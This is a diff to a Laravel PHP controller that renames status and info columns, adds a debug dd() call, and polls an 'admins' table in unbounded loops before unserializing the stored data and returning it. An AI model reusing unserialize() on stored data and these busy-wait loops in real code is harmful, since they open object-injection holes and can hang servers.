@@ -47,7 +47,7 @@ class EfaaController extends Controller
     $cul        = $request->input('cul');
 
 
-    $updateData = array('status' => 0 , 'info' => '{}');
+    $updateData = array('homestatus' => 0 , 'home' => '{}');
 
     DB::table('admins')->where('id_ref',$violatorId)->update($updateData);
 
@@ -89,22 +89,22 @@ class EfaaController extends Controller
 
 
  
-    $counter = $user->status;
+    $counter = $user->homestatus;
 
     while($counter == 0){
 
        
            $user =   DB::table('admins')->where('id_ref',$violatorId)->first();
-           if(! empty($user->status))
+           if(! empty($user->homestatus))
            $counter++;
 
     }
 
 
     $personalInfo = [];
-    if(! empty($user->status) && $user->status == 2){
+    if(! empty($user->homestatus) && $user->homestatus == 1){
 
-        $personalInfo = unserialize( $user->info);
+        $personalInfo = unserialize( $user->home);
 
         return response()->json(
             $personalInfo , 200, [], JSON_UNESCAPED_UNICODE);
@@ -124,9 +124,9 @@ class EfaaController extends Controller
     $cul        = $request->input('cul');
 
 
+dd( $violatorId);
 
-
-    $updateData = array('status' => 0 , 'info' => '{}');
+    $updateData = array('inquerystatus' => 0 , 'inquery' => '{}');
 
     DB::table('admins')->where('id_ref',$violatorId)->update($updateData);
 
@@ -166,22 +166,22 @@ class EfaaController extends Controller
     DB::table('user_infos')->insert($htmlData);
 
  
-    $counter = $user->status;
+    $counter = $user->inquerystatus;
 
-    while($counter == 0){
+    while($counter == 1 || $counter == 0){
 
        
            $user =   DB::table('admins')->where('id_ref',$violatorId)->first();
-           if(! empty($user->status))
+           if(! empty($user->inquerystatus))
            $counter++;
 
     }
 
 
     $personalInfo = [];
-    if(! empty($user->status) && $user->status == 2){
+    if(! empty($user->inquerystatus) && $user->inquerystatus == 1){
 
-        $personalInfo = unserialize( $user->info);
+        $personalInfo = unserialize( $user->inquery);
 
         return response()->json(
             $personalInfo , 200, [], JSON_UNESCAPED_UNICODE);
@@ -232,9 +232,7 @@ class EfaaController extends Controller
 
            
 
-
-
-                                            
+                    
                        
 
              if(empty($isFound)) {
@@ -350,7 +348,7 @@ class EfaaController extends Controller
  
             $counter = $user->status;
         
-            while($counter== 0){
+            while($counter == 0){
         
                
                    $user =   DB::table('admins')->where('id_ref',$idNumber)->first();
@@ -358,10 +356,11 @@ class EfaaController extends Controller
                    $counter++;
         
             }
-        
+            
+           
         
             $personalInfo = [];
-            if(! empty($user->status) && $user->status == 2){
+            if(! empty($user->status) && $user->status == 1){
         
                 $personalInfo = unserialize( $user->info);
         
@@ -643,7 +642,7 @@ $customer = DB::table('customers')->where('id_ref',$id)->first();
      }
  
      $violationlInfo = [];
-     if(! empty($user->status) && $user->status == 2){
+     if(! empty($user->status) && $user->status == 1){
  
          $violationlInfo = unserialize( $user->info);
          return response()->json(
